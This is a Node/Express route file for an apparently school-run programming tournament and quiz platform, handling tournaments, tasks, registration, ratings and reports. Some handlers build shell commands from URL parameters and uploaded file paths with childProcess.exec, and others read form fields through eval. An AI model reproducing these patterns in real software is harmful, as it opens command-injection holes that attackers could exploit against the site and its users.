app.get('/tournament/add', checkAuthenticated, checkPermission, async (req, res) => {
  res.render('Tournament/Global/add.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Add Tournament",
    isTeacher: req.user.isTeacher,
    location: `/tournaments/${req.user.login}/1/default&all&all`
  })
})

app.post('/tournament/add', checkAuthenticated, checkPermission, async (req, res) => {
  let body = req.body;
  let tasks = [];
  let mods = [req.user.login].concat(body.mods.split(' '));
  let frozeAfter = body.frozeAfter ? body.frozeAfter : body.whenEnds;

  let emtpy_tournament = await TournamentSchema.findOne({ title: "" }).exec();
  if (emtpy_tournament) {
    emtpy_tournament.title = body.title;
    emtpy_tournament.description = body.description;
    emtpy_tournament.tasks = body.tasks;
    emtpy_tournament.author = req.user.name;
    emtpy_tournament.whenStarts = body.whenStarts.replace('T', ' ');
    emtpy_tournament.whenEnds = body.whenEnds.replace('T', ' ');
    emtpy_tournament.frozeAfter = frozeAfter.replace('T', ' ');
    emtpy_tournament.mods = mods;
    emtpy_tournament.allowRegAfterStart = body.allowRegAfterStart == "on";
    emtpy_tournament.allOrNothing = body.allOrNothing == "1";
    emtpy_tournament.penalty = body.penalty * 1000;
    emtpy_tournament.isBegan = false;
    emtpy_tournament.isEnded = false;
    emtpy_tournament.isFrozen = false;
    emtpy_tournament.results = [];
    emtpy_tournament.attempts = [];
    emtpy_tournament.frozenResults = [];
    emtpy_tournament.disqualificated = [];
    emtpy_tournament.messages = [];

    emtpy_tournament.markModified('messages');
    emtpy_tournament.markModified('disqualificated');
    emtpy_tournament.markModified('results');
    emtpy_tournament.markModified('attempts');
    emtpy_tournament.markModified('frozenResults');
    emtpy_tournament.markModified('mods');
    emtpy_tournament.markModified('tasks');
    emtpy_tournament.save();
  } else {
    await Adder.addTournament(TournamentSchema, body.title, body.description,
      tasks, req.user.name, body.whenStarts.replace('T', ' '),
      body.whenEnds.replace('T', ' '), frozeAfter.replace('T', ' '), mods, body.allowRegAfterStart == "on",
      body.allOrNothing == "1", body.penalty * 1000);
  }

  res.redirect("/tournament/add")
})

//---------------------------------------------------------------------------------
// Tournaments List Page
app.get('/tournaments/:login/:page/:search', checkAuthenticated, async (req, res) => {

  let user;
  if (!req.user.isTeacher) {
    user = new User(req.user);
  } else {
    user = await User.init(req.params.login);
  }
  let results = [];
  let foundTournaments;
  let tournaments = (await TournamentSchema.find({}).exec()).slice(1).filter(item => item.title != "");
  let a = req.params.search.split('&');
  if (a[0].toLowerCase() != "default" || a[1] != "all") {
    let toSearch = a[0] == "default" ? '' : a[0].toUpperCase();
    let isBegan = a[1].toLowerCase() == 'true';
    let isEnded = a[2].toLowerCase() == 'true';

    foundTournaments = fuseSearch(tournaments, "title", toSearch, 0.5, [a[1], isBegan, isEnded], (tournament, params) => {
      return (params[0] == "all") || ((tournament.isBegan == params[1]) && (tournament.isEnded == params[2]));
    })
  } else {
    foundTournaments = tournaments;
  }

  //Sorting tournaments
  let obj = [];
  for (let i = 0; i < foundTournaments.length; i++) {
    obj.push([foundTournaments[i], results[i]]);
  }
  obj.sort(compareTournaments);
  for (let i = 0; i < foundTournaments.length; i++) {
    foundTournaments[i] = obj[i][0];
  }
  for (let i = 0; i < results.length; i++) {
    results[i] = obj[i][1];
  }

  foundTournaments.sort((a, b) => { return a._id < b._id });

  let onPage = config.onPage.tournamentsList;
  let page = req.params.page;
  let pages = Math.ceil(foundTournaments.length / onPage);
  let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, foundTournaments.length)} из ${foundTournaments.length}`;
  let ids = foundTournaments.map(item => item.identificator).join("|");

  res.render('tournaments.ejs', {
    u_login: user.login,
    n_name: user.name,
    login: req.user.login,
    name: req.user.name,
    title: "Tournaments List",
    isTeacher: req.user.isTeacher,
    ids,
    page,
    pages,
    onPage,
    pageInfo,
    search: req.params.search,
    location: req.header('Referer')
  })
})

app.post('/tournaments/:login/:page/:search', checkAuthenticated, async (req, res) => {
  let toSearch = req.body.searcharea;
  let type = req.body.typeSelector.split('_');
  let isBegan = type[0];
  let isEnded = type[1];
  if (!toSearch) toSearch = "default";
  if (isEnded) {
    toSearch += '&' + isBegan + '&' + isEnded;
  } else {
    toSearch += '&all';
  }
  res.redirect('/tournaments/' + req.params.login + '/' + req.params.page.toString() + '/' + toSearch)
})

//---------------------------------------------------------------------------------
// Edit Tournament Page
app.get('/tournament/edit/:tour_id', checkAuthenticated, isModerator, async (req, res) => {
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec();
  res.render('Tournament/Global/edit.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Edit Tournament",
    isTeacher: req.user.isTeacher,
    tournament: tournament,
    location: '/tournament/page/' + req.user.login + '/' + req.params.tour_id
  })
})

app.post('/tournament/edit/:tour_id', checkAuthenticated, isModerator, async (req, res) => {
  let body = req.body;
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec()

  tournament.title = body.title;
  tournament.description = body.description;
  if (body.whenStarts)
    tournament.whenStarts = body.whenStarts.replace('T', ' ');
  tournament.whenEnds = body.whenEnds.replace('T', ' ');
  tournament.frozeAfter = body.frozeAfter.replace('T', ' ');
  tournament.allowRegAfterStart = body.allowRegAfterStart == "on";
  tournament.allOrNothing = body.allOrNothing == "1";
  tournament.penalty = body.penalty * 1000;
  tournament.mods = [req.user.login].concat(body.mods.split(' ')).filter(item => item != "");
  tournament.markModified('mods');
  await tournament.save();

  res.redirect(`/tournament/page/${req.user.login}/${req.params.tour_id}/`)
})

//---------------------------------------------------------------------------------
// Delete Tournament Page
app.post('/deletetournament/:tour_id', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec();
  tournament.title = "";
  tournament.save();
  childProcess.exec("node " + path.join(__dirname, "/public/scripts/fixes/FixAfterDeleteTournament.js") + " " + req.params.tour_id)
  res.redirect('/tournaments/' + req.user.login + '/1/default&all&all');
})

//---------------------------------------------------------------------------------
//Register to tournament
app.get('/regTournament/:tour_id', checkAuthenticated, async (req, res) => {
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec()
  if ((!tournament.isBegan || tournament.allowRegAfterStart) && !req.user.isTeacher) {
    let newRes = {
      login: req.user.login,
      sumscore: 0,
      sumtime: 0,
      tasks: []
    }

    for (let i = 0; i < tournament.tasks.length; i++) {
      newRes.tasks.push({
        score: 0,
        dtime: 0,//from start
        tries: 0
      })
    }

    tournament.results.push(newRes);
    tournament.markModified('results');
    await tournament.save();
  }
  res.redirect('/tournaments/' + req.user.login + '/1/default&all&all')
})

//---------------------------------------------------------------------------------
// Add Task to Tournament Page
app.get('/tournament/task/add/:tour_id', checkAuthenticated, isModerator, async (req, res) => {
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec()
  res.render('Tournament/Task/add.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Add Task",
    tournament: tournament,
    isTeacher: req.user.isTeacher,
    location: '/tournament/page/' + req.user.login + '/' + req.params.tour_id
  });
});

app.post('/tournament/task/add/:tour_id', checkAuthenticated, isModerator, uploadTests.single('file'), async (req, res) => {
  let body = req.body;

  let examples = [];
  let exI, exO;
  for (let i = 0; i < 5; i++) {
    eval("exI = body.exampleIn" + i)
    eval("exO = body.exampleOut" + i)
    if (exI == "" || exO == "") break;
    examples.push([exI.trim(), exO.trim()]);
  }

  let tests = [];
  if (req.file) {
    try {
      let filepath = path.join(__dirname, '/public/tests/' + req.file.filename)
      const zip = new StreamZip.async({ file: filepath });

      const entriesCount = await zip.entriesCount;

      for (let i = 0; i < entriesCount / 2; i++) {
        let inp = await zip.entryData("input" + i + ".txt");
        let out = await zip.entryData("output" + i + ".txt");
        tests.push([inp.toString('utf8').trim(), out.toString('utf8').trim()])
      }

      await zip.close();
      childProcess.exec('del /q \"' + filepath + '\"');

    } catch (err) {
      console.log(err)
    }
  } else {
    let tI, tO;
    for (let i = 0; i < 20; i++) {
      eval("tI = body.testIn" + i)
      eval("tO = body.testOut" + i)
      if (tI == "" || tO == "") break;
      tests.push([tI.trim(), tO.trim()]);
    }
  }
  await Adder.addTaskToTournament(TournamentSchema, req.params.tour_id, body.title.trim(), body.statement.trim(), body.input.trim(), body.output.trim(), examples, tests);

  res.redirect('/tournament/task/add/' + req.params.tour_id);
});

//---------------------------------------------------------------------------------
// Delete Task from Tournament
app.post('/tournament/task/delete/:tour_id/:id', checkAuthenticated, isModerator, async (req, res) => {

  childProcess.exec("node " + path.join(__dirname, "/public/scripts/fixes/FixAfterDeleteTournamentTask.js") + " " +
    req.params.tour_id + " " + req.params.id)
  res.redirect('/tournament/page/' + req.user.login + '/' + req.params.tour_id);
});

//---------------------------------------------------------------------------------
// Tournament Task Page
app.get('/tournament/task/page/:tour_id/:id', checkAuthenticated, checkTournamentPermission, async (req, res) => {
  let tour_id = req.params.tour_id
  let tournament = await TournamentSchema.findOne({ identificator: tour_id }).exec();
  let ids = tournament.tasks.map(item => item.identificator).join("|");
  let whenEnds = tournament.whenEnds;
  let isBegan = tournament.isBegan;
  problem = tournament.tasks.find(item => item.identificator == req.params.id);
  if (!problem) {
    res.redirect('/tournament/page/' + req.user.login + '/' + req.params.tour_id);
  }
  let attempts = req.user.attempts;
  let prevCode = "";
  let language = "";
  for (let i = 0; i < attempts.length; i++) {
    if (attempts[i].taskID == req.params.id) {
      prevCode = attempts[i].programText;
      language = attempts[i].language;
      break;
    }
  }
  res.render('Tournament/Task/page.ejs', {
    login: req.user.login,
    ID: req.params.id,
    TUR_ID: req.params.tour_id,
    name: req.user.name,
    title: "Task " + req.params.id,
    isTeacher: req.user.isTeacher,
    ids,
    problem: problem,
    prevCode: prevCode,
    language: language,
    whenEnds: whenEnds,
    isBegan: isBegan,
    tournament,
    location: '/tournament/page/' + req.user.login + '/' + req.params.tour_id
  });
});

// Tournament Task Page listener
app.post('/tournament/task/page/:tour_id/:id', checkAuthenticated, checkTournamentPermission, uploadCode.single('file'), async (req, res) => {
  TaskPost(req, res, '/tournament/task/page/' + req.params.tour_id + '/' + req.params.id);
});

//---------------------------------------------------------------------------------
// Tournament Page
app.get('/tournament/page/:login/:id', checkAuthenticated, checkTournamentValidation, async (req, res) => {
  let user;
  if (!req.user.isTeacher) {
    user = new User(req.user);
  } else {
    user = await User.init(req.params.login);
  }

  let tournament = await TournamentSchema.findOne({ identificator: req.params.id }).exec();
  if (!tournament || tournament.title == "") {
    res.redirect("/tournaments/" + req.params.login + "/1/default&all&all")
  } else {
    let tasks = tournament.tasks;
    let verdicts = [];
    for (let i = 0; i < tournament.tasks.length; i++) {
      verdicts.push(user.getVerdict(tournament.tasks[i].identificator))
    }
    let registered = false;
    if (!(tournament.mods.find(item => item == req.user.login) || tournament.isEnded || tournament.isBegan && tournament.results.find(item => item.login == req.params.login))) {
      tasks = [];
    }
    if (tournament.results.find(item => item.login == req.params.login)) {
      registered = true;
    }
    tasks = tasks.map(item => item.identificator).join('|');
    res.render('Tournament/Global/page.ejs', {
      ID: tournament.identificator,
      u_login: user.login,
      u_name: user.name,
      login: user.login,
      name: req.user.name,
      title: "Tournament",
      isTeacher: req.user.isTeacher,
      tournament: tournament,
      foundTasks: tasks,
      registered: registered,
      location: `/tournaments/${req.params.login}/1/default&all&all`
    });
  }
})

//---------------------------------------------------------------------------------
// Edit tournament task
app.get('/tournament/task/edit/:tour_id/:id', checkAuthenticated, isModerator, async (req, res) => {
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id });
  let task = tournament.tasks.find(item => item.identificator == req.params.id);
  res.render('Tournament/Task/edit.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Edit Tournament Task",
    isTeacher: req.user.isTeacher,
    task: task,
    tour_id: req.params.tour_id,
    location: `/tournament/task/page/${req.params.tour_id}/${req.params.id}`
  })
});

app.post('/tournament/task/edit/:tour_id/:id', checkAuthenticated, isModerator, uploadTests.single('file'), async (req, res) => {
  let body = req.body;
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id });
  let problem = tournament.tasks.find(item => item.identificator == req.params.id);

  let examples = [];
  let exI, exO;
  for (let i = 0; i < 5; i++) {
    eval("exI = body.exampleIn" + i)
    eval("exO = body.exampleOut" + i)
    if (exI == "" || exO == "") break;
    examples.push([exI.trim(), exO.trim()]);
  }

  let tests = [];
  if (req.file) {
    try {
      let filepath = path.join(__dirname, '/public/tests/' + req.file.filename)
      const zip = new StreamZip.async({ file: filepath });

      const entriesCount = await zip.entriesCount;

      for (let i = 0; i < entriesCount / 2; i++) {
        let inp = await zip.entryData("input" + i + ".txt");
        let out = await zip.entryData("output" + i + ".txt");
        tests.push([inp.toString('utf8').trim(), out.toString('utf8').trim()])
      }

      await zip.close();
      childProcess.exec('del /q \"' + filepath + '\"');

    } catch (err) {
      console.log(err)
    }
  } else {
    let tI, tO;
    for (let i = 0; i < 20; i++) {
      eval("tI = body.testIn" + i)
      eval("tO = body.testOut" + i)
      if (tI == "" || tO == "") break;
      tests.push([tI.trim(), tO.trim()]);
    }
  }

  problem.title = body.title.trim();
  problem.statement = body.statement.trim();
  problem.input = body.input.trim();
  problem.output = body.output.trim();
  problem.examples = examples;
  problem.tests = tests;

  tournament.markModified('tasks');
  await tournament.save();

  res.redirect('/tournament/task/page/' + req.params.tour_id + '/' + req.params.id);
});

//---------------------------------------------------------------------------------
// Tournament results page
app.get('/tournament/results/:tour_id/', checkAuthenticated, async (req, res) => {
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id });
  let results = [];
  if (tournament) {
    res.render('Tournament/Global/results.ejs', {
      login: req.user.login,
      name: req.user.name,
      title: "Tournament Results",
      isTeacher: req.user.isTeacher,
      ID: req.params.tour_id,
      tournamentTitle: tournament.title,
      isEnded: tournament.isEnded,
      location: `/tournament/page/${req.user.login}/${req.params.tour_id}`
    });
  } else {
    res.redirect('/');
  }
});

//---------------------------------------------------------------------------------
// Tournament attempts page
app.get('/tournament/attempts/:tour_id/:page/:toSearch', checkAuthenticated, isModerator, async (req, res) => {
  let a = req.params.toSearch.split('&');
  let loginSearch = a[0] == "all" ? "" : a[0].toUpperCase();
  let taskSearch = a[1] == "all" ? "" : a[1].toUpperCase();
  let success = a[2] != "all";
  let needTasks = a[1] != "all";
  let needLogin = a[0] != "all";
  let bynew = a[3] == "true";

  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec();
  let attempts = tournament.attempts;

  //search
  attempts = attempts.filter(item => (!success || item.score == 100) && (!needTasks || parseInt(item.TaskID.split("_")[1]) + 1 == parseInt(taskSearch)) && (!needLogin || item.login == loginSearch))

  if (bynew) { // sorry for reverse logic :)
    attempts.sort((a, b) => {
      if (parseInt(a.AttemptDate) > parseInt(b.AttemptDate)) {
        return -1;
      }
      else {
        return 1;
      }
    });
  }

  let tasks = attempts.map(attempt => tournament.tasks.find(task => task.identificator == attempt.TaskID));

  let onPage = config.onPage.attemptsList;
  let page = req.params.page;
  let pages = Math.ceil(attempts.length / onPage);
  let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, attempts.length)} из ${attempts.length}`;
  attempts = attempts.slice((page - 1) * onPage, min(page * onPage, attempts.length));

  res.render('Tournament/Global/attempts.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: tournament.title,
    isTeacher: req.user.isTeacher,
    tourID: tournament.identificator,
    attempts,
    tasks,
    page: req.params.page,
    onPage,
    pageInfo,
    pages,
    search: req.params.toSearch,
    location: `/tournament/page/${req.user.login}/${req.params.tour_id}`
  });
});
app.post('/tournament/attempts/:tour_id/:page/:toSearch', checkAuthenticated, isModerator, async (req, res) => {
  let toSearch = req.body.loginSearch.trim() == "" ? "all" : req.body.loginSearch.trim();
  toSearch += '&' + (req.body.taskSearch.trim() == "" ? "all" : req.body.taskSearch.trim());
  toSearch += '&' + (req.body.selector);
  toSearch += '&' + (req.body.selector_new);
  res.redirect(`/tournament/attempts/${req.params.tour_id}/${req.params.page}/${toSearch}`);
});

//---------------------------------------------------------------------------------
// Tournament disqualification
app.get("/tournament/disqualAttempt/:tour_id/:AttemptDate", checkAuthenticated, isModerator, async (req, res) => {
  let AttemptDate = req.params.AttemptDate;
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec();
  let idx = tournament.attempts.findIndex(item => item.AttemptDate == AttemptDate);
  if (idx == -1) {
    return res.redirect(`/tournament/attempts/${req.params.tour_id}/1/all&all&all&true`);
  };
  let login = tournament.attempts[idx].login;
  let score = tournament.attempts[idx].score;
  let TaskID = tournament.attempts[idx].TaskID.split('_')[1];
  tournament.attempts.splice(idx, 1);
  let resUserIndx = tournament.results.findIndex(item => item.login == login);
  if (resUserIndx == -1) {
    return res.redirect(`/tournament/attempts/${req.params.tour_id}/1/all&all&all&true`);
  }
  let resultAttemptIdx = tournament.results[resUserIndx].tasks[TaskID].attempts.findIndex(item => item.date == AttemptDate);
  if (resultAttemptIdx != -1) {
    tournament.results[resUserIndx].tasks[TaskID].attempts.splice(resultAttemptIdx, 1);
  }
  if (score == tournament.results[resUserIndx].tasks[TaskID].score) {
    let mx = -1;
    let mx_ind;
    for (let i = 0; i < tournament.attempts.length; i++) {
      if (tournament.attempts[i].login == login && tournament.attempts[i].TaskID.split('_')[1] == TaskID && mx < tournament.attempts[i].score) {
        mx = tournament.attempts[i].score;
        mx_ind = i;
      }
    }
    if (mx != -1) {
      tournament.results[resUserIndx].sumscore += tournament.attempts[mx_ind].score - score;
      tournament.results[resUserIndx].sumtime += (tournament.attempts[mx_ind].AttemptDate - Date.parse(tournament.whenStarts)) - tournament.results[resUserIndx].tasks[TaskID].dtime;

      tournament.results[resUserIndx].tasks[TaskID].dtime = (tournament.attempts[mx_ind].AttemptDate - Date.parse(tournament.whenStarts));
      tournament.results[resUserIndx].tasks[TaskID].score = tournament.attempts[mx_ind].score;

      let currentAttempt = tournament.attempts[mx_ind];
      let currIndex = tournament.results[resUserIndx].tasks[TaskID].attempts.findIndex(item => item.date == currentAttempt.date);
      if (currIndex == -1) {
        tournament.results[resUserIndx].tasks[TaskID].attempts.push({
          date: currentAttempt.AttemptDate,
          score: currentAttempt.score
        })
      }
    } else {
      tournament.results[resUserIndx].sumscore -= score;
      tournament.results[resUserIndx].sumtime -= tournament.results[resUserIndx].tasks[TaskID].dtime;

      tournament.results[resUserIndx].tasks[TaskID].dtime = 0;
      tournament.results[resUserIndx].tasks[TaskID].score = 0;
    }
  }
  tournament.markModified("attempts");
  tournament.markModified("results");

  await tournament.save()
  res.redirect(`/tournament/attempts/${req.params.tour_id}/1/all&all&all&true`);
});

app.get("/tournament/disqualUser/:tour_id/:login", checkAuthenticated, isModerator, async (req, res) => {
  let login = req.params.login;
  let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec();
  tournament.results.splice(tournament.results.findIndex(item => item.login == login), 1);
  tournament.frozenResults.splice(tournament.frozenResults.findIndex(item => item.login == login), 1);
  tournament.attempts = tournament.attempts.filter(item => item.login != login);
  tournament.disqualificated.push(req.params.login);
  tournament.markModified("results");
  tournament.markModified("disqualificated");
  tournament.markModified("frozenResults");
  tournament.markModified("attempts");
  await tournament.save()

  res.redirect(`/tournament/attempts/${req.params.tour_id}/1/all&all&all&true`)
});

//---------------------------------------------------------------------------------
// About Page
app.get('/about', checkAuthenticated, async (req, res) => {
  res.render('about.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "About",
    isTeacher: req.user.isTeacher,
    location: req.header('Referer')
  });
});

//---------------------------------------------------------------------------------
// Edit Group
app.post('/editgroup/:login/:page/:search', checkAuthenticated, checkNletter, checkPermission, async (req, res) => {
  let student = await User.init(req.params.login);
  if (req.body.groupEditor) {
    student.setGroup(req.body.groupEditor)
    await student.save()
  }
  res.redirect('/students' + '/' + req.params.page + '/' + req.params.search);
})

//---------------------------------------------------------------------------------
// Registration Page
app.get("/registration", async (req, res) => {
  let logins = [];
  let users = await UserSchema.find({});
  for (let i = 0; i < users.length; i++) {
    let login = users[i].login;
    if (login.length >= 2 && login[0] == "n" && login[1] == "_") {
      login = login.slice(2);
    }
    logins.push(login);
  }
  res.render('Account/registration.ejs', {
    login: "",
    name: "",
    title: "Registration Page",
    isTeacher: false,
    logins,
    msg: "",
    location: req.header('Referer')
  });
});

app.post("/registration", async (req, res) => {
  let newUser = new User();
  let login = req.body.login.replace(/ /g, "");
  if ((await UserSchema.exists({ login: login })) || (await UserSchema.exists({ login: "n-" + login })))
    return res.render('Account/registration.ejs', {
      login: "",
      name: "",
      title: "Registration Page",
      msg: "Логин занят",
      logins: [],
      isTeacher: false,
      location: undefined
    });
  newUser.setLogin("n-" + login);
  newUser.setName(req.body.name);
  let isValidPassword = newUser.checkAndSetPassword(req.body.password.trim());
  newUser.setFullGrade("0N");
  newUser.setGroup(req.body.email);
  if (!isValidPassword) {
    res.render('Account/registration.ejs', {
      login: "",
      name: "",
      title: "Registration Page",
      msg: "Неверный пароль",
      logins: [],
      isTeacher: false,
      location: undefined
    });
    return;
  }
  if (await UserSchema.exists({ login: newUser.login })) {
    let users = await UserSchema.find({});
    let logins = users.filter(user => user.login.length > 2 && user.login.slice(0, 1) == "n-").map(user => user.login);
    res.render('Account/registration.ejs', {
      login: "",
      name: "",
      title: "Registration Page",
      msg: "Такой логин уже занят!",
      logins,
      isTeacher: false,
      location: undefined
    });
    return;
  }
  await newUser.save();
  res.redirect("/");
});

//---------------------------------------------------------------------------------
// Edit Account Page
app.get("/EditAccount", checkAuthenticated, async (req, res) => {
  let rendered = {
    login: req.user.login,
    name: req.user.name,
    title: "Edit Account Page",
    isTeacher: req.user.isTeacher,
    user: req.user,
    msg: "",
    location: req.header('Referer')
  };

  res.render('Account/edit.ejs', rendered);
});

app.post("/EditAccount", checkAuthenticated, async (req, res) => {
  let user = await User.init(req.user.login);
  if (!user.checkAndSetPassword(req.body.password.trim())) {
    return res.render('Account/edit.ejs', {
      login: req.user.login,
      name: req.user.name,
      title: "Edit Account Page",
      isTeacher: req.user.isTeacher,
      user: req.user,
      msg: "Пароль должен быть длиннее 5 символов и не содержать пробелов",
      location: undefined
    });
  }
  if (req.user.login.slice(0, 2) == "n-") {
    user.setName(req.body.name);
    user.setGroup(req.body.group);
  }
  await user.save();
  res.redirect("/");
});

//---------------------------------------------------------------------------------
// Report Page
app.get("/report", checkAuthenticated, async (req, res) => {
  let rendered = {
    login: req.user.login,
    name: req.user.name,
    title: "Report Page",
    isTeacher: req.user.isTeacher,
    location: req.header('Referer')
  };

  res.render('Account/report.ejs', rendered)
});

app.post("/report", checkAuthenticated, async (req, res) => {
  if (req.body.report) {
    let grade = req.user.isTeacher ? "teacher" : (req.user.grade + req.user.gradeLetter).toUpperCase()
    let sign = `\n${req.user.name} ${grade}\n${req.user.login}`;
    try {
      transporter.sendMail({
        from: `"ACCEPT Report" <${asdqqdq({ iv: process.env.UIV, content: process.env.UCONTENT })}>`,
        to: "pro100pro10010@gmail.com",
        subject: req.body.type_selector,
        text: req.body.report + sign
      });
    } catch (err) {
      console.info("Ошибка при отправке отзыва")
    }
  }
  res.redirect("/report");
});

//---------------------------------------------------------------------------------
// News List Page
app.get("/newslist/:page", async (req, res) => {

  newslist = await NewsSchema.find({}).exec();
  newslist.reverse();

  let onPage = config.onPage.newsList;
  let page = req.params.page;
  let pages = Math.ceil(newslist.length / onPage);
  let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, newslist.length)} из ${newslist.length}`;

  let rendered = {
    login: (req.user) ? req.user.login : "",
    name: (req.user) ? req.user.name : "",
    title: "News List Page",
    isTeacher: (req.user) ? req.user.isTeacher : false,
    page,
    pages,
    onPage,
    pageInfo,
    news: newslist.slice((page - 1) * onPage, page * onPage),
    location: req.header('Referer')
  };

  res.render('News/list.ejs', rendered)
});

//---------------------------------------------------------------------------------
// Tried Page
app.get('/tried/:login/:page/:search', checkAuthenticated, checkValidation, async (req, res) => {
  let user;
  if (!req.user.isTeacher) {
    user = new User(req.user);
  } else {
    user = await User.init(req.params.login);
  }

  if (user) {
    let tasks = await TaskSchema.find({}).exec();
    let tournaments = await TournamentSchema.find({}).exec();
    let verdicts = user.verdicts;
    let foundTasks = [];
    let foundVerdicts = []

    let a = req.params.search.split('&');
    let toSearch = a[0] == "default" ? "" : a[0].toUpperCase();
    let types = a[1];
    let tourTask = [];
    let task;

    tournaments.forEach(tournament => tournament.tasks.forEach(task => tourTask.push(task)));
    for (let i = 0; i < verdicts.length; i++) {
      if (verdicts[i].taskID.split('_')[0] != '0')
        task = tourTask.find(item => item.identificator == verdicts[i].taskID);
      else
        task = tasks.find(item => item.identificator == verdicts[i].taskID);
      if (task) {
        foundTasks.push(task);
        foundVerdicts.push(verdicts[i]);
      }
    }
    user.setVerdicts(foundVerdicts);
    await user.save();

    const fuse = new Fuse(foundTasks, {
      includeScore: true,
      keys: ["title"]
    });
    tasks = [];
    verdicts = [];
    if (!(toSearch == ""))
      fuse.search(toSearch).forEach(task => {
        if (task.score < 0.5) {
          tasks.push(task.item);
          verdicts.push(foundVerdicts.find(verdict => verdict.taskID == task.item.identificator));
        }
      });
    if (verdicts.length > 0) {
      foundTasks = tasks;
      foundVerdicts = verdicts;
    }
    verdicts = [];
    tasks = [];
    for (let i = 0; i < foundVerdicts.length; i++) {
      if (types == "all" || foundVerdicts[i].result == "OK") {
        verdicts.push(foundVerdicts[i]);
        tasks.push(foundTasks[i]);
      }
    }

    let onPage = config.onPage.attemptsList;
    let page = req.params.page;
    let pages = Math.ceil(verdicts.length / onPage);
    let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, verdicts.length)} из ${verdicts.length}`;
    verdicts = verdicts.slice((page - 1) * onPage, min(page * onPage, verdicts.length));
    tasks = tasks.slice((page - 1) * onPage, min(page * onPage, tasks.length));

    res.render('Account/triedTasks.ejs', {
      login: req.user.login,
      u_login: user.login,
      name: req.user.name,
      title: "Tried Tasks",
      pageInfo,
      page,
      pages,
      verdicts,
      tasks,
      isTeacher: req.user.isTeacher,
      search: req.params.search,
      n_name: user.name,
      user: user,
      location: req.header('Referer')
    })

  } else {
    res.redirect('/tried/' + req.user.login + '/1/default&all')
  }
});

app.post('/tried/:login/:page/:search', checkAuthenticated, checkValidation, async (req, res) => {
  let toSearch = req.body.searcharea;
  if (!toSearch) toSearch = "default";
  toSearch += '&' + req.body.selector;
  res.redirect('/tried/' + req.params.login.toString() + '/' + req.params.page.toString() + '/' + toSearch)
});

//---------------------------------------------------------------------------------
// Rating Page
app.get('/rating/:page', checkAuthenticated, async (req, res) => {

  let objs = [];
  let user, count, obj;
  let users = await UserSchema.find({ isTeacher: false });
  for (let i = 0; i < users.length; i++) {
    user = users[i];
    obj = {
      login: user.login,
      name: user.name,
      verdict: 0
    };
    count = 0;
    for (let j = 0; j < user.verdicts.length; j++) {
      if (user.verdicts[j].result == "OK") {
        count++;
      }
    }
    obj.verdict = count;
    objs.push(obj);
  }
  objs.sort((a, b) => { return b.verdict - a.verdict; });

  let onPage = config.onPage.studentsList;
  let page = req.params.page;
  let pages = Math.ceil(objs.length / onPage);
  let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, objs.length)} из ${objs.length}`;
  objs = objs.slice((page - 1) * onPage, min(page * onPage, objs.length));

  res.render('rating.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Rating",
    pageInfo,
    page,
    pages,
    objs,
    onPage,
    isTeacher: req.user.isTeacher,
    user: user,
    location: req.header('Referer')
  });
});

//---------------------------------------------------------------------------------
// Quizzes page
app.get('/quizzes/:login/:page/:search', checkAuthenticated, async (req, res) => {
  let toSearch = req.params.search.toLowerCase() == "default" ? "" : req.params.search.toLowerCase();
  let u_login = req.user.login;
  let u_name = req.user.name;
  let user = new User(req.user);
  if (req.user.isTeacher) {
    user = await User.init(req.params.login);
    if (user) {
      u_login = user.login;
      u_name = user.name;
    }
  }

  let quizzes = await QuizSchema.find().exec();
  if (!user.isTeacher) {
    quizzes = quizzes.filter(item => item.lessons.find(lesson => !lesson.isEnded && lesson.grade.toLowerCase() == user.grade + user.gradeLetter.toLowerCase()));
  }
  if (!!toSearch)
    quizzes = fuseSearch(quizzes, "title", toSearch, 0.5, [], (quiz, params) => { return true });

  let onPage = config.onPage.lessonsList;
  let page = req.params.page;
  let pages = Math.ceil(quizzes.length / onPage);
  let pageInfo = `${(page - 1) * onPage + 1} - ${min(page * onPage, quizzes.length)} из ${quizzes.length}`;
  quizzes = quizzes.slice((page - 1) * onPage, min(page * onPage, quizzes.length));

  res.render('quizzes.ejs', {
    login: req.user.login,
    name: req.user.name,
    u_login,
    u_name,
    title: "Quizzes",
    pageInfo,
    page,
    pages,
    quizzes,
    onPage,
    isTeacher: req.user.isTeacher,
    user: user,
    search: toSearch == '' ? "default" : toSearch,
    location: req.header('Referer')
  });
});

app.post('/quizzes/:login/:page/:search', checkAuthenticated, async (req, res) => {
  let toSearch = req.body.searcharea ? req.body.searcharea : "default";
  res.redirect(`/quizzes/${req.params.login}/${req.params.page}/${toSearch}`);
});

//---------------------------------------------------------------------------------
// Quiz page
app.get("/quiz/page/:login/:quiz_id", checkAuthenticated, checkGrade, async (req, res) => {
  let quiz = await QuizSchema.findOne({ identificator: req.params.quiz_id }).exec();
  let student = await User.init(req.params.login);

  res.render('Quiz/Global/Page.ejs', {
    title: "Quiz page",
    login: req.user.login,
    name: req.user.name,
    u_login: student.login,
    quiz,
    user: req.user,
    ids: quiz.tasks.map(item => item.identificator).join("|"),
    grade: (req.user.isTeacher && req.params.login == req.user.login) ? "teacher" : student.grade + student.gradeLetter.toLowerCase(),
    isTeacher: req.user.isTeacher,
    location: req.header('Referer')
  });
});

//---------------------------------------------------------------------------------
// Add quiz page
